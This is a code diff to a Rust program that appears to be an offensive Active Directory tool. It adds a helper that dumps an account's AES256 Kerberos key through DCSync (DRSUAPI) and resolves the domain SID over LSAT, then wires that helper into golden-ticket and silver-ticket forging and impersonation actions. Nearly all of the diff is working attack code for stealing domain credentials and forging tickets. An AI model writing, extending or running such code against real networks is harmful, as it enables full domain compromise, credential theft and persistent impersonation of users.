@@ -483,8 +483,8 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
             .await
         }
         Action::Golden => {
-            let krbtgt_aes256 = prompt_key("krbtgt AES256 key (64 hex, from DCSync krbtgt)")?;
-            let domain_sid = prompt_sid()?;
+            let (krbtgt_aes256, domain_sid) =
+                fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
             let (user, rid) = prompt_impersonation()?;
             let verify_spn: String = Input::new()
                 .with_prompt("Verify against SPN (empty = skip KDC check)")
@@ -509,12 +509,15 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
             .await
         }
         Action::Silver => {
-            let service_aes256 = prompt_key("service account AES256 key (64 hex, from DCSync)")?;
+            let account: String = Input::new()
+                .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
+                .interact_text()?;
+            let (service_aes256, domain_sid) =
+                fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
             let spn: String = Input::new()
                 .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                 .with_initial_text(format!("cifs/{}", s.dc))
                 .interact_text()?;
-            let domain_sid = prompt_sid()?;
             let (user, rid) = prompt_impersonation()?;
             let out: String = Input::new()
                 .with_prompt("ccache output path (empty = don't save)")
@@ -542,15 +545,17 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .default(0)
                 .interact()?
                 == 0;
-            let (krbtgt_aes256, service_aes256) = if golden_mode {
-                (Some(prompt_key("krbtgt AES256 key (64 hex)")?), None)
+            let (krbtgt_aes256, service_aes256, domain_sid) = if golden_mode {
+                let (k, sid) = fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
+                (Some(k), None, sid)
             } else {
-                (
-                    None,
-                    Some(prompt_key("service account AES256 key (64 hex)")?),
-                )
+                let account: String = Input::new()
+                    .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
+                    .interact_text()?;
+                let (k, sid) =
+                    fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
+                (None, Some(k), sid)
             };
-            let domain_sid = prompt_sid()?;
             let (user, rid) = prompt_impersonation()?;
             let spn: String = Input::new()
                 .with_prompt("Target SPN")
@@ -578,6 +583,63 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
         }
         Action::ShowRoadmap | Action::Exit => Ok(()),
     }
+}
+
+/// Auto-fetch `account`'s AES256 key (via DCSync) and the domain SID (via LSAT) using the
+/// session's admin credentials — so golden/silver/pth need no manual paste. Falls back to manual
+/// prompts if declined or if the account has no AES256 key.
+async fn fetch_key_and_sid(
+    s: &Session,
+    account: &str,
+    key_label: &str,
+) -> Result<(String, String)> {
+    let auto = Confirm::new()
+        .with_prompt(format!(
+            "Auto-fetch {account}'s AES256 key + domain SID via DCSync (uses your session creds)?"
+        ))
+        .default(true)
+        .interact()?;
+    if !auto {
+        return Ok((prompt_key(key_label)?, prompt_sid()?));
+    }
+
+    // Key via DCSync (DRSUAPI over sealed RPC).
+    let mut drs =
+        dcerpc::drsuapi::DrsSession::bind(&s.dc, &s.netbios(), &s.username, &s.password).await?;
+    let (_rid, _nt, kerb) = drs.dcsync(&s.netbios(), account).await?;
+    let key = kerb
+        .iter()
+        .find(|k| k.etype_name() == "aes256-cts-hmac-sha1-96")
+        .map(|k| hex::encode(&k.key))
+        .context("account has no AES256 key in supplementalCredentials")?;
+
+    // Domain SID via LSAT (resolve the account, drop the RID).
+    let sid = lookup_domain_sid(s, account).await?;
+    println!("[*] fetched {account} AES256 key + domain SID {sid}");
+    Ok((key, sid))
+}
+
+/// Resolve `account` to a SID over LSAT and strip the RID to yield the domain SID string.
+async fn lookup_domain_sid(s: &Session, account: &str) -> Result<String> {
+    let mut smb = smb2_client::SmbClient::connect(&s.dc).await?;
+    smb.login(&s.dc, &s.netbios(), &s.username, &s.password)
+        .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", s.dc)).await?;
+    let pipe = smb.open_pipe("lsarpc").await?;
+    let mut c = dcerpc::lsat::LsatClient::bind(&mut smb, pipe).await?;
+    let policy = c.open_policy().await?;
+    let sid = c
+        .lookup_name(&policy, account)
+        .await?
+        .context("LSAT could not resolve the account to a SID")?;
+    let mut subs = sid.sub_authorities.clone();
+    subs.pop(); // drop the RID → domain SID
+    let domain = windows_sddl::Sid {
+        revision: sid.revision,
+        identifier_authority: sid.identifier_authority,
+        sub_authorities: subs,
+    };
+    Ok(domain.to_string())
 }
 
 /// Prompt for a 64-hex AES256 key, trimming/validating length.
